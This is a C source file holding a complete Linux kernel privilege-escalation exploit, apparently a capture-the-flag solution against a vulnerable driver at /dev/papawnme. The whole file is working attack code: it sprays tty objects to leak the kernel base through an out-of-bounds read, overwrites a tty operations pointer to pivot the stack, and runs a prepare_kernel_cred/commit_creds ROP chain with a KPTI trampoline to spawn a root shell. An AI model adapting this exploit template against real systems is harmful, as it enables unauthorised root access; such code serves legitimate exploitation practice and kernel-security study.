#define _GNU_SOURCE
#include "libpwn.h"

#define DEVICE "/dev/papawnme"
#define CMD_KMALLOC     0x1770
#define CMD_KFREE       0x1771
#define CMD_READ        0x1772
#define CMD_WRITE       0x1773
#define CMD_OOB_READ    0x1774
#define CMD_OOB_WRITE   0x1775

#define MAX_IDX 4 // only 5 to 0 index pls
#define MIN_SIZE 0xa8
#define MAX_SIZE 0x2aa
#define SPRAY_WIDTH 20

#define iretq (kbase + 0x021982)
#define pop_rdi (kbase + 0x4031e9)
#define commit_creds (kbase + 0x7e8b0)
#define swapgs_popfq_ret (kbase + 0xc00f0a)
#define add_rdi_rax_stuff (kbase + 0x55025a)
#define prepare_kernel_cred (kbase + 0x7ecb0)
#define kpti_trampoline (kbase + 0xc00aa0)
#define push_r12_stuff_pop_rsp_pop_r13 (kbase + 0x9dff9e) // 0xffffffff819dff9e: grep "push r12.*pop rsp\|pop rsp.*push r12" gadgets.txt

void _pause_(const char *msg) {
    printf("[PAUSE] %s\n", msg);
    getchar();
}

void success(const char *msg) {
    printf("[SUCCESS] %s\n", msg);
}

void success2(const char *msg, u64 val) {
    printf("[SUCCESS] %s: %#lx\n", msg, val);
}

void info(const char *msg) {
    printf("[INFO] %s\n", msg);
}

void info2(const char *msg, u64 val) {
    printf("[INFO] %s: %#lx\n", msg, val);
}

void warn(const char *msg) {
    printf("[WARN] %s\n", msg);
}

void error(const char *msg) {
    printf("[ERROR] %s\n", msg);
}

void panic(const char *msg) {
    printf("[PANIC] ");
    perror(msg);
    exit(0x132);
}

void save_state() {
    __asm__(".intel_syntax noprefix;"
            "mov _proc_cs, cs;"
            "mov _proc_ss, ss;"
            "mov _proc_rsp, rsp;"
            "pushf;" // push rflags
            "pop _proc_rflags;"
            ".att_syntax");

    printf("[+] CS: 0x%lx, SS: 0x%lx, RSP: 0x%lx, RFLAGS: 0x%lx\n", _proc_cs, _proc_ss, _proc_rsp, _proc_rflags);
}

void spawn_shell() {
    puts("[+] Hello Userland!");
    int uid = getuid();
    if (uid == 0)
        printf("[+] UID: %d (root poggers)\n", uid);
    else {
        printf("[!] UID: %d (epic fail)\n", uid);
    }

    puts("[*] starting shell");
    system("/bin/sh");

    puts("[*] quitting exploit");
    exit(0); // avoid ugly segfault
}

typedef struct {
    u64 idx;
    u64 size;
    u64 data;
} request;

typedef struct {
    u64 src_idx;
    u64 dst_idx;
    u64 size;
} request_migrate;

char buffer[0x1000];
int tty[SPRAY_WIDTH];
int fd; 

void ioctl_kmalloc(u64 idx, u64 size, u64 data){
    request req = {
        .idx = idx,
        .size = size,
        .data = data
    };

    if (size < MIN_SIZE || size > MAX_SIZE) error("invalid size");

    if (ioctl(fd, CMD_KMALLOC, &req) < 0) error("ioctl: kmalloc");
}

void ioctl_kfree(u64 idx){
    request req = {
        .idx = idx
    };

    if (ioctl(fd, CMD_KFREE, &req) < 0) error("ioctl: kfree");
}

void ioctl_read(u64 idx, u64 size, u64 data){
    request req = {
        .idx = idx,
        .size = size,
        .data = data
    };

    if (ioctl(fd, CMD_READ, &req) < 0) error("ioctl: read");
}

void ioctl_write(u64 idx, u64 size, u64 data){
    request req = {
        .idx = idx,
        .size = size,
        .data = data
    };

    if (ioctl(fd, CMD_WRITE, &req) < 0) error("ioctl: write");
}

void ioctl_oob_write(u64 src, u64 dst, u64 size){
    request_migrate req = {
        .src_idx = src, // does not matter
        .dst_idx = dst, // does not matter
        .size = size
    };

    if (ioctl(fd, CMD_OOB_WRITE, &req) < 0) error("ioctl: oob write");
}

void ioctl_oob_read(u64 src, u64 dst, u64 size){
    request_migrate req = {
        .src_idx = src,
        .dst_idx = dst,
        .size = size
    };

    if (ioctl(fd, CMD_OOB_READ, &req) < 0) error("ioctl: oob read");
}

int main(int argc, char *argv[]){
    signal(SIGSEGV, spawn_shell);
    save_state();

    fd = open(DEVICE, O_RDWR);
    if (fd < 0) panic("open");

    // =========================================
    // SPRAY LEAK KERNEL BASE
    // =========================================
    for(int i = 0; i < SPRAY_WIDTH; i++) {
        tty[i] = open(TTY_FILE, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    for(int i = 0; i < SPRAY_WIDTH; i++) {
        close(tty[i]);
    }

    ioctl_kmalloc(0, MAX_SIZE, 0);
    ioctl_read(0, MAX_SIZE, (u64)&buffer);

    kbase = ((u64 *)&buffer)[3] - 0x10713c0;
    info2("kbase", kbase);
    _pause_("kbase leaked");
    if ((kbase & 0xffffffff00000000) != 0xffffffff00000000 || (kbase & 0xfffff) != 0x00000) {
        panic("unable to calculate kernel base");
    }

    // =========================================
    // SPRAY 
    // =========================================
    ioctl_kmalloc(1, MAX_SIZE, 0);
    ioctl_kmalloc(2, MAX_SIZE, 0);
    for(int i = 0; i < SPRAY_WIDTH; i++) {
        tty[i] = open(TTY_FILE, O_RDWR | O_NOCTTY);
        if(tty[i] < 0) {
            error("open ptmx");
        }
    }

    memset(buffer, 0x0, 0x1000);
    ioctl_read(1, MAX_SIZE, (u64)&buffer);
    u64 heap = ((u64 *)&buffer)[0];
    info2("heap idx 2", heap);

    // =========================================
    // LINK MIGRATE
    // =========================================
    _pause_("triggering link & migrate");
    memset(buffer, 0x0, 0x1000);
    // unsigned long *ptr = (unsigned long *)&buffer;
    // for(int i = 0x0; i < 0x400/0x8; i++) {
    //     *ptr++ = 0xdeadc0dedead0000 + (i << 8);
    // }
    ((u64 *)&buffer)[0] = 0x100005401;
    ((u64 *)&buffer)[2] = heap+0x800; // writable area
    ((u64 *)&buffer)[3] = heap;
    ioctl_write(2, MAX_SIZE, (u64)&buffer);
    ioctl_oob_write(2, 2, 0x400);

    // =========================================
    // PREPARE PAYLOAD
    // =========================================
    memset(buffer, 0x0, 0x1000);
    ((u64 *)&buffer)[0] = heap+0x200;
    ((u64 *)&buffer)[12] = push_r12_stuff_pop_rsp_pop_r13; 

    u64* chain = (u64*) &buffer[0x200];
    *chain++ = 0x0;
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = prepare_kernel_cred;
    *chain++ = pop_rdi;
    *chain++ = 0x0;
    *chain++ = add_rdi_rax_stuff;
    *chain++ = commit_creds;
    *chain++ = kpti_trampoline;
    *chain++ = 0x0;
    *chain++ = 0x0;
    *chain++ = (unsigned long) &spawn_shell;
    *chain++ = _proc_cs;
    *chain++ = _proc_rflags;
    *chain++ = _proc_rsp;
    *chain++ = _proc_ss;
    ioctl_write(2, MAX_SIZE, (u64)&buffer);

    _pause_("triggering payload");
    for(int i = 0; i < SPRAY_WIDTH; i++){
        ioctl(tty[i], 0xdeadc0de /* esi ecx ebx */, heap+0x200 /* rdx r8 r12 */);
    }

    _pause_("end of exploit ...");
    return 0;
}